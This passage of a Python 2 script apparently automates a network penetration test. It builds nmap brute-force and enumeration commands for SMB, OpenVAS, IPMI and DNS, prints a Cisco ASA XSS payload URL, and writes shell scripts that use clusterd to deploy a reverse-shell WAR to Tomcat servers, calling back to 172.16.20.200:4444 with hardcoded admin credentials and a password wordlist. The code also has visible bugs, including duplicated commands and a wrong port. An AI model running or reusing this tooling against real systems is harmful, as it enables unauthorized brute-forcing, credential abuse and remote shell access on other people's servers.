			logFilename=origPath+"/runPort5850.log"
			if not os.path.exists(logFilename):
				for host in p5850List:
					host = host.strip()

					fullCmd = "nmap -p 5850 --script openlookup-info "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["5850",hostNo,fullCmd])

	if taskToRun=="9390" or taskToRun=="all":
		filename = origPath+"/port9390.txt"
		p9390List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p9390List.append(line)
			logFilename=origPath+"/runPort9390.log"
			if not os.path.exists(logFilename):
				for host in p9390List:
					host = host.strip()

					fullCmd = "nmap -p 9390 --script omp2-brute,omp2-enum-targets "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["9390",hostNo,fullCmd])
		
	if taskToRun=="9391" or taskToRun=="all":
		filename = origPath+"/port9391.txt"
		p9391List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p9391List.append(line)
			logFilename=origPath+"/runPort9391.log"
			if not os.path.exists(logFilename):
				for host in p9391List:
					host = host.strip()

					fullCmd = "nmap -sV --script=openvas-otp-brute -p 9193 "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["9193",hostNo,fullCmd])
					if quiet==False:
    						print fullCmd
					cmdList.append(["9193",hostNo,fullCmd])
		
	if taskToRun=="9929" or taskToRun=="all":
		filename = origPath+"/port9929.txt"
		p9929List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p9929List.append(line)
			logFilename=origPath+"/runPort9929.log"
			if not os.path.exists(logFilename):
				for host in p9929List:
					host = host.strip()

					fullCmd = "nmap -p 9929 --script nping-brute "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["9929",hostNo,fullCmd])


	if taskToRun=="49152" or taskToRun=="all":
		filename = origPath+"/port49152.txt"
		p49152List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p49152List.append(line)
			logFilename=origPath+"/runPort9152.log"
			if not os.path.exists(logFilename):
				for host in p49152List:
					host = host.strip()

					fullCmd = "nmap -p49152 --script supermicro-ipmi-conf "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["49152",hostNo,fullCmd])


	if taskToRun=="445" or taskToRun=="all" or taskToRun=="smb":
		filename = origPath+"/port445.txt"
		p445List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p445List.append(line)
			#cmdList = []
			for host in p445List:
				host = host.strip()
				logFilename=origPath+"/enum4linux_"+host+".log"
				if not os.path.exists(logFilename):
					fullCmd = "/pentest/SpiderLabs/enum4linux.pl -a "+host+" 2>&1 >> "+logFilename
					cmdList.append(["445",hostNo,fullCmd])
				logFilename1=origPath+"/port445_"+host+".log"
				if not os.path.exists(logFilename):
					if not os.path.exists(logFilename1):
						fullCmd = "nmap --script smb-brute.nse -p445 -iL "+origPath+"/port445.txt 2>&1 >> "+logFilename1
						cmdList.append(["445",hostNo,fullCmd])
				logFilename=origPath+"/smbclient_"+host+".log"
				if not os.path.exists(logFilename):
					if not os.path.exists(logFilename):
						fullCmd = "smbclient -L //"+host+" -N -U 'test%test'>> "+logFilename
						cmdList.append(["445",hostNo,fullCmd])


	if taskToRun=="137" or taskToRun=="all":
		filename = origPath+"/port137.txt"
		p137List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p137List.append(line)
    			#cmdList = []
			for host in p137List:
				host = host.strip()

				logFilename=origPath+"/port137_"+host+".log"
				if not os.path.exists(logFilename):
					fullCmd = "sudo nmap -sU -sS --script smb-brute.nse -p U:137,T:139 "+host[0]+" 2>&1 >> "+logFilename
					cmdList.append(["137",hostNo,fullCmd])


	if taskToRun=="53" or taskToRun=="all" or taskToRun=="dns":
		filename = origPath+"/port53.txt"
		p53List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p53List.append(line)
    			#cmdList = []
			for host in p53List:
				host = host.strip()
				print host
				try:
					if len(options.domainName)>0:				
						logFilename=origPath+"/runPort53_zonetransfer_"+host+".log"
						if not os.path.exists(logFilename):
							fullCmd = "nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain="+options.domainName+" "+domainName+" "+host+" 2>&1 >> "+logFilename
							cmdList.append(fullCmd)
							cmdList.append(["53",hostNo,fullCmd])

				except TypeError:
					continue
				logFilename=origPath+"/runPort53_cache_"+host+".log"
				if not os.path.exists(logFilename):
					fullCmd = "nmap -Pn -sU -p 53 -Pn --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={yahoo.com,google.com,gmail.google.com}' "+host+" 2>&1 >> "+logFilename
					cmdList.append(["137",hostNo,fullCmd])

				logFilename=origPath+"/runPort53_dig_"+host+".log"
				if not os.path.exists(logFilename):
    					fullCmd = "dig +short yahoo.com TXT @"+host+" 2>&1 >> "+logFilename
					cmdList.append(["137",hostNo,fullCmd])


	if len(cmdList)>0:
		print "- Sorting cmdList"
		cmdList = sorted(cmdList, key=lambda x: x[0])

		print "- Slicing cmdList into chunks"
		tempList = chunk(cmdList, int(numProcesses))
       	 	totalCount=len(tempList)
        	count = 1
       		for urlList in tempList:
			jobs = []
               		jobid=0
              		print "- Set "+str(count)+" of "+str(totalCount)
              		for url in urlList:
				print "- Testing: "+url[1]+"\t"+url[0]
				jobs.append((jobid,url[0],url[1],url[2]))
				jobid = jobid+1
			resultsList = execute1(jobs,numProcesses)
			for i in resultsList:
				if i[1]=="telnet":
			    		resultsList1 =  i[3].split("\n")
   	 				for line in resultsList1:
						line = line.strip()
						if "found:" in line.lower():
							resultListtelnet.append(i[2])
							resultListtelnet.append(line)
				if i[1]=="ssh":
	    				resultsList1 =  i[3].split("\n")
   	 				for line in resultsList1:
						line = line.strip()
						if "found:" in line.lower():
							resultListssh.append(i[2])
							resultListssh.append(line)
				if i[1]=="whatweb":
	    				resultsList1 =  i[3].split("\n")
   	 				for line in resultsList1:
						line = line.strip()
						resultListwhatweb.append(line)
				if i[1]=="shellshock":
	    				resultsList1 =  i[3].split("\n")
   	 				for line in resultsList1:
						line = line.strip()
						resultListshellshock.append(line)
				if i[1]=="clusterd":
	    				resultsList1 =  i[3].split("\n")
					#ansi_escape = re.compile(r'\x1b[^m]*m')
					#hostNo = i[2]
   	 				#for line in resultsList1:
					#	line = line.strip()
					#	line = ansi_escape.sub('', line)
					#	resultListclusterd.append(line)		

				if  i[1]=="sslcert":
			    		resultsList1 =  i[3].split("\n")
   			 		for line in resultsList1:
						line = line.strip()
			                        if "| ssl-cert: Subject: commonName=" in line and "*." not in line:
       			 	                        hostName = line.replace("| ssl-cert: Subject: commonName=","").split("/")[0]
							resultListsslcert.append(i[2]+"\t"+hostName)	

				if i[1]=="heartbleed":
		    			resultsList1 =  i[3].split("\n")
   		 			for line in resultsList1:
						line = line.strip()
						if "VULNERABLE:" in line:
							resultListheartbleed.append(i[2])
				if i[1]=="sslknownkey":
			    		resultsList1 =  i[3].split("\n")
   			 		for line in resultsList1:
						line = line.strip()
						if "Found in" in line:
							resultListsslknownkey.append(i[2])
							resultListsslknownkey.append(line)	
	
				if i[1]=="sslccs":
			    		resultsList1 =  i[3].split("\n")
   			 		for line in resultsList1:
						hostName = i[2]
			                        if "may allow early" in line:
							resultListsslccs.append(i[2])
							resultListsslccs.append(line)
				if i[1]=="sslcert":
					commonNamesList=[]
		    			resultsList1 =  i[3].split("\n")
    					tempTitle = ""
   	 				for line in resultsList1:
						line = line.strip()
	        	       	         	if "| ssl-cert: Subject: commonName=" in line and "*." not in line:
        	       	        	        	hostName = line.replace("| ssl-cert: Subject: commonName=","").split("/")[0]
							commonNamesList.append(i[2]+"\t"+hostName)
					if len(commonNamesList)>0:
						print "Found the below common names in the SSL certificates"
						for host in commonNamesList:
							print host		


				resultList = i[3].split("\n")
			count+=1
	
	filename = origPath+"/report.txt"
	reportFilename = open(filename,"w")


	if len(resultListwhatweb)>0:
		header = "******************************** WhatWeb ********************************"
		reportFilename.write(header+"\n")
		for x in resultListwhatweb:
			reportFilename.write(x+"\n")

	if len(resultListsslcert)>0:
		header = "******************************** SSL Cert ********************************"
		reportFilename.write(header+"\n")
		for x in resultListsslcert:
			reportFilename.write(x+"\n")

	if len(resultListsslknownkey)>0:
		header = "******************************** SSL Known Key ********************************"
		reportFilename.write(header+"\n")
		for x in resultListsslknownkey:
			reportFilename.write(x+"\n")

	if len(resultListsslccs)>0:
		header = "******************************** SSL CCS ********************************"
		reportFilename.write(header+"\n")
		for x in resultListsslccs:
			reportFilename.write(x+"\n")

	if len(resultListheartbleed)>0:
		header = "******************************** SSL Heartbleed ********************************"
		reportFilename.write(header+"\n")
		for x in resultListheartbleed:
			reportFilename.write(x+"\n")

	if len(resultListssh)>0:
		header = "******************************** SSH ********************************"
		reportFilename.write(header+"\n")
		for x in resultListssh:
			reportFilename.write(x+"\n")

	if len(resultListtelnet)>0:
		header = "******************************** Telnet ********************************"
		reportFilename.write(header+"\n")
		for x in resultListtelnet:
			reportFilename.write(x+"\n")

	#for x in resultListssl:
	#	reportFilename.write(x+"\n")

	if len(resultList25)>0:
		header = "******************************** Port 25 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList25:
			reportFilename.write(x+"\n")

	if len(resultList53)>0:
		header = "******************************** Port 53********************************"
		reportFilename.write(header+"\n")
		for x in resultList53:	
			reportFilename.write(x+"\n")
			
	if len(resultList137)>0:
		header = "******************************** Port 137 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList137:
			reportFilename.write(x+"\n")

	if len(resultList139)>0:
		header = "******************************** Port 139 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList139:
			reportFilename.write(x+"\n")

	if len(resultList161)>0:
		header = "******************************** Port 161 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList161:
			reportFilename.write(x+"\n")

	if len(resultList445)>0:
		header = "******************************** Port 445 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList445:
			reportFilename.write(x+"\n")

	if len(resultList500)>0:
		header = "******************************** Port 500 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList500:
			reportFilename.write(x+"\n")

	if len(resultList512)>0:
		header = "******************************** Port 512 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList512:	
			reportFilename.write(x+"\n")

	if len(resultList513)>0:
		header = "******************************** Port 513 ********************************"	
		reportFilename.write(header+"\n")
		for x in resultList513:
			reportFilename.write(x+"\n")

	if len(resultList554)>0:
		header = "******************************** Port 554 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList554:
			reportFilename.write(x+"\n")

	if len(resultList873)>0:
		header = "******************************** Port 873 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList873:
			reportFilename.write(x+"\n")

	if len(resultList902)>0:
		header = "******************************** Port 902 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList902:
			reportFilename.write(x+"\n")	

	if len(resultList1080)>0:
		header = "******************************** Port 1080 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList1080:
			reportFilename.write(x+"\n")

	if len(resultList1099)>0:
		header = "******************************** Port 1099 ********************************"
		reportFilename.write(header+"\n")	
		for x in resultList1099:
			reportFilename.write(x+"\n")
	
	if len(resultList1723)>0:
		header = "******************************** Port 1723 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList1723:
			reportFilename.write(x+"\n")

	if len(resultList2002)>0:
		header = "******************************** Port 2002 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList2002:
			reportFilename.write(x+"\n")

	if len(resultList2010)>0:
		header = "******************************** Port 2010 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList2010:
			reportFilename.write(x+"\n")

	if len(resultList2401)>0:
		header = "******************************** Port 2401 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList2401:
			reportFilename.write(x+"\n")

	if len(resultList3306)>0:
		header = "******************************** Port 3389 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList3306:
			reportFilename.write(x+"\n")

	if len(resultList3389)>0:
		header = "******************************** Port 3389 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList3389:
			reportFilename.write(x+"\n")
	
	if len(resultList5432)>0:
		header = "******************************** Port 5432 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList5432:
			reportFilename.write(x+"\n")

	if len(resultList5850)>0:
		header = "******************************** Port 5850 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList5850:
			reportFilename.write(x+"\n")

	if len(resultList5900)>0:
		header = "******************************** Port 5900 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList5900:
			reportFilename.write(x+"\n")

	if len(resultList6379)>0:
		header = "******************************** Port 6379 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList6379:
			reportFilename.write(x+"\n")

	if len(resultList8098)>0:
		header = "******************************** Port 8098 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList8098:
			reportFilename.write(x+"\n")	

	if len(resultList9160)>0:
		header = "******************************** Port 9160 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList9160:
			reportFilename.write(x+"\n")

	if len(resultList5432)>0:
		header = "******************************** Port 5432 ********************************"	
		reportFilename.write(header+"\n")
		for x in resultList5432:
			reportFilename.write(x+"\n")

	if len(resultList5666)>0:
		header = "******************************** Port 5666 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList5666:
			reportFilename.write(x+"\n")	

	if len(resultList9390)>0:
		header = "******************************** Port 9390 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList9390:
			reportFilename.write(x+"\n")

	if len(resultList9391)>0:
		header = "******************************** Port 9391 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList9391:
			reportFilename.write(x+"\n")

	if len(resultList9929)>0:
		header = "******************************** Port 9929 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList9929:
			reportFilename.write(x+"\n")

	if len(resultList27017)>0:
		header = "******************************** Port 27017 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList27017:
			reportFilename.write(x+"\n")

	if len(resultList49152)>0:
		header = "******************************** Port 49152 ********************************"
		reportFilename.write(header+"\n")
		for x in resultList49152:
			reportFilename.write(x+"\n")

	reportFilename.close()
	##End of Module


	if len(resultListASAXSS)>0:
		print "\n****** Cisco ASA XSS Vulnerability ****** "
		for x in resultListASAXSS:
			print "https://"+x+"/+CSCOE+/logon.html?reason=2&auth_handle=\"%20style%3dbehavior%3aurl('%23default%23time2')%20onbegin%3d'alert(String.fromCharCode(88,83,83))'"


if __name__ == '__main__':
    #global numProcesses
    parser = argparse.ArgumentParser()
    parser.add_argument('-quiet', action='store_true', help='[only show results]')
    parser.add_argument('-results', action='store_true', help='[parse log files and show results]')
    parser.add_argument('-tasks', dest='taskName',  action='store', help='[task name]')
    parser.add_argument('-threads', dest='numProcesses',  action='store', help='[number of threads]')
    parser.add_argument('-domain', dest='domainName', action='store', help='[domain name]')

    #if len(sys.argv)==1:
    #    parser.print_help()
    #    sys.exit(1)

    options = parser.parse_args()

    os.chdir(origPath)
    taskList=[]
    taskList.append("bruteURL")
    '''
    taskList.append("1080")
    taskList.append("1098")
    taskList.append("1099")
    taskList.append("137")
    taskList.append("139")
    taskList.append("1723")
    taskList.append("2002")
    taskList.append("2010")
    taskList.append("2401")
    taskList.append("25")
    taskList.append("27017")
    taskList.append("3306")
    taskList.append("3389")
    taskList.append("49152")
    taskList.append("5060")
    taskList.append("512")
    taskList.append("513")
    taskList.append("5432")
    taskList.append("554")
    taskList.append("5666")
    taskList.append("5850")
    taskList.append("5900")
    taskList.append("6379")
    taskList.append("8098")
    taskList.append("873")
    taskList.append("902")
    taskList.append("9160")
    taskList.append("9390")
    taskList.append("9391")
    taskList.append("9929")
    taskList.append("asa")
    taskList.append("clusterd")
    taskList.append("dns")
    taskList.append("ftp")
    taskList.append("ntp")
    #taskList.append("shellshock")
    taskList.append("smb")
    taskList.append("snmp")
    taskList.append("ssh")
    taskList.append("ssl")
    taskList.append("telnet")
    taskList.append("tilde")
    taskList.append("vpn")
    taskList.append("whatweb")
    taskList.append("xmpp")
    taskList.append("yasuo")
    '''
	
    #Removing empty log files
    for filename in glob.glob(os.getcwd()+"/*.log"):
	if os.stat(filename).st_size == 0:
		os.remove(filename)
    if options.results:
	parseLogs()
        sys.exit()
    if options.domainName:
	domainName=domainName

    if options.numProcesses:
	numProcesses=str(options.numProcesses)
    else:
	numProcesses=str(10)

    if (str(options.taskName).lower()).strip()!="all":
	if options.quiet:
		taskToRun=options.taskName
		#runModules(quiet=True)
        	sys.exit()
	else:
		taskToRun=options.taskName
		#runModules(quiet=False)
        	sys.exit()
    else:
	for taskName in taskList:
		taskToRun=taskName
		runModules(quiet=True)
 	#parseLogs()
        sys.exit()

    '''  
    #Zipping PeepingTom Screenshots
    #if glob.glob(os.getcwd()+"/peepingtom/1*"):
    #	cmd = "zip screenshots.zip -r "+os.getcwd()+"/peepingtom/1*"
    #	print commands.getoutput(cmd)
    '''
    
    #Parsing and Running Clusterd Attack Payloads
    resultList=[]
    for filename in glob.glob("runClusterd*.log"):
        #filename = sys.argv[1]
        filenameParts = filename.split("_")

	portNo = filenameParts[3].replace(".log","")
        hostIP = filenameParts[1]+"://"+filenameParts[2].replace(".log","")+":"+portNo
	
	lines = []
        with open(filename) as f:
                lines = f.read().splitlines()
        ansi_escape = re.compile(r'\x1b[^m]*m')
        #found=False
        for line in lines:
                line = ansi_escape.sub('', line)
		if "] 	" in line:
                        #if found==False:
                        #       resultList.append("\n"+hostIP)
                        #        found=True
                        line1 = line.split("] ")[1].strip()
                        resultList.append([hostIP,line1])
    if len(resultList)>0:
	    file = open("runJboss.sh", "a+")
	    cmd = "cd /tmp1/clusterd"
	    file.write(cmd+"\n")
	    for result in resultList:
		if "jboss" in result[1].lower():
			scheme = result[0].split(":")[0]
			hostNo = result[0].split(":")[1].replace("//","")
			portNo = result[0].split(":")[2]
	
			url = scheme+"://"+hostNo+":"+portNo
			if scheme=="http":
				cmd = "cd "+clusterdPath+" && python "+clusterdPath+"/clusterd.py -i "+hostNo+" -p "+portNo+" -a jboss -v4.2 --random-agent --jb-smb --jb-info"
			if scheme=="https":
				cmd = "cd "+clusterdPath+" && python "+clusterdPath+"/clusterd.py --ssl -i "+hostNo+" -p "+portNo+" -a jboss -v4.2 --random-agent --jb-smb --jb-info"
			print cmd
			file.write(cmd+"\n")
	    file.close()		

	    file = open("runTomcat.sh", "a+")
	    cmd = "cd /tmp1/clusterd"
	    file.write(cmd+"\n")
	    for result in resultList:
		if "tomcat manager" in result[1].lower():
			scheme = result[0].split(":")[0]
			hostNo = result[0].split(":")[1].replace("//","")
			porTNo = result[0].split(":")[2]

			#cmd = "python /tmp1/clusterd/clusterd.py -i "+hostNo+" -p "+portNo+" -a tomcat --tc-ofetch --tc-info --tc-list --tc-smb"
			#cmd = "python /tmp1/clusterd/clusterd.py -i "+hostNo+" -p "+portNo+" -a tomcat --gen-payload 172.16.20.200:4444 --deploy shell.war --invoke --rand-payload -o windows -b admin --wordlist /tmp1/passwords.txt --tc-ofetch --tc-info --tc-list --tc-smb""

			if scheme=="http":
				cmd = "cd "+clusterdPath+" && python "+clusterdPath+"/clusterd.py -i "+hostNo+" -p "+portNo+" -a tomcat --usr-auth admin:Tomct123$ --gen-payload 172.16.20.200:4444 --deploy shell.war --invoke --rand-payload -o linux -b admin --wordlist /tmp1/passwords.txt --tc-ofetch --tc-info --tc-list --tc-smb"
			if scheme=="https":
				cmd = "cd "+clusterdPath+" && python "+clusterdPath+"/clusterd.py --ssl -i "+hostNo+" -p "+portNo+" -a tomcat --usr-auth admin:Tomct123$ --gen-payload 172.16.20.200:4444 --deploy shell.war --invoke --rand-payload -o linux -b admin --wordlist /tmp1/passwords.txt --tc-ofetch --tc-info --tc-list --tc-smb"

			print cmd
	    		file.write(cmd+"\n")
	    file.close()		
